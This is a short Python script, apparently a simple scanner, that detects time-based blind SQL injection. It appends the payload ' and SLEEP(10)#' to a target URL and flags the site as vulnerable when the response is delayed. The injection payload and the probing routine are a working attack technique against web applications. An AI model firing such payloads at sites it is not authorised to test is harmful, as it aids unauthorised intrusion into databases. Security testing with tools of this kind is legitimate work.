from urllib.parse import urlsplit, parse_qs
from urllib  import request
from bs4 import BeautifulSoup
import re
import urllib.error
import requests
import threading
from webbrowser import open_new_tab



def BlindSQL(urls):
    open_new_tab(urls)
    responsetime = requests.get(urls)
    print(responsetime.elapsed.seconds)
    responsetime = responsetime.elapsed.seconds
    if responsetime < 10 :
        print("#"*40)
        return False,responsetime
    else:
        print("#"*40)
        print(urls+" \nvulnerable to Blind Sql Injection",)
        return True,responsetime
    print("error")
        
def check_url(urls):
    blind_payload = " and SLEEP(10)#"
    urlmerge = urls+blind_payload
    urlencode=urlmerge.replace(" ","%20")
    flag,responsetime = BlindSQL(urlencode)
    return flag,urlencode,responsetime